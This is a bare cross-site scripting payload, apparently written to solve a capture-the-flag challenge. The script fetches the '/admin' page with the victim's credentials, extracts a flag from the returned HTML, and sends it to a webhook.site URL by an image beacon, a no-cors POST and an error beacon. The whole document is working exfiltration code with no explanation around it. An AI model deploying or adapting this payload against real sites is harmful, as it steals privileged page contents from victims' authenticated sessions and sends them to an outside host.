<script>
  async function stealFlag() {
    try {
      const response = await fetch('/admin', { credentials: 'include' });
      const html = await response.text();
      
      // Method 1: Extract from h4
      const h4Match = html.match(/<h4>([^<]+)<\/h4>/);
      const flag = h4Match ? h4Match[1] : 'NOT_FOUND_IN_H4';
      
      // Send using multiple methods
      // Method A: Image tag
      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?method=img&flag=${encodeURIComponent(flag)}`;
      
      // Method B: Fetch POST
      fetch('https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab', {
        method: 'POST',
        mode: 'no-cors',
        body: flag
      });
      
      // Method C: If flag contains flag{...} pattern
      const flagPattern = html.match(/flag{.*?}/i);
      if (flagPattern) {
        new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?pattern=${encodeURIComponent(flagPattern[0])}`;
      }
      
    } catch(error) {
      new Image().src = `https://webhook.site/5a0bcea6-6223-4e18-8e0d-7759204334ab?error=${encodeURIComponent(error.message)}`;
    }
  }
  
  stealFlag();
</script>
